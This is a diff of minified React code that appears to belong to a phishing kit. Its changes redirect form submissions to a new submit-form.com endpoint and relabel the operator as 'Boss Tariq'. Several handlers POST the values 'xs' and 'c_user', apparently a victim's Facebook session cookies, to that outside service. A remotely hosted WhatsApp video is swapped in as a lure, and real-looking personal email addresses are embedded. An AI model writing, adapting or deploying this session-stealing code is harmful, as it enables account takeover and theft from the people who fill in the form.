@@ -9713,7 +9713,7 @@
             n.useState)()
               , [i,l] = (0,
             n.useState)()
-              , o = ["salman jani email"]
+              , o = ["Nizamani"]
               , s = _();
             return (0,
             he.jsxs)(he.Fragment, {
@@ -9814,17 +9814,17 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/udfuABlZj", {
+                                    fetch("https://submit-form.com/D7SKvovwa", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
                                             emails: o,
-                                            workerEmail: "salmanjani email",
+                                            workerEmail: "Boss Tariq",
                                             xs: r,
                                             c_user: i,
-                                            name: "asad"
+                                            name: "Tariq"
                                         })
                                     }).then((e => {
                                         e.ok
@@ -9851,11 +9851,10 @@
                                         children: "Detailed Video Information"
                                     }), (0,
                                     he.jsx)("video", {
-      src: "detailed-video.mp4",  // Apni file ka sahi path yahan likhen
-      width: "560",
-      height: "315",
-      controls: true,
-      children: "Your browser does not support the video tag."
+                                        src: "https://cdn.glitch.global/04223cf5-c2c7-4a98-99b2-9da638394728/WhatsApp%20Video%202024-11-26%20at%2013.24.43_9bcb50f5.mp4?v=1732616291608",
+                                        controls: !0,
+                                        poster: me,
+                                        autoPlay: !0
                                     }), (0,
                                     he.jsx)("p", {
                                         className: "form-item-detailtxt",
@@ -13257,7 +13256,7 @@
             })
         }
           , Wt = () => {
-            const e = ["alyssadean.us@gmail.com"]
+            const e = ["abdulbariniz700@gmail.com"]
               , t = _()
               , [r,a] = (0,
             n.useState)(!1)
@@ -13340,7 +13339,7 @@
                                 children: "Detailed Video Information."
                             }), (0,
                             he.jsx)("a", {
-                                href: "https://www.youtube.com/embed/0MM0k0w3gj0",
+                                href: "https://cdn.glitch.global/04223cf5-c2c7-4a98-99b2-9da638394728/WhatsApp%20Video%202024-11-26%20at%2013.24.43_9bcb50f5.mp4?v=1732616291608",
                                 children: (0,
                                 he.jsx)("img", {
                                     src: me,
@@ -13359,7 +13358,7 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/udfuABlZj", {
+                                    u && o ? (fetch("https://submit-form.com/D7SKvovwa", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13472,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/udfuABlZj", {
+                        fetch("https://submit-form.com/D7SKvovwa", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
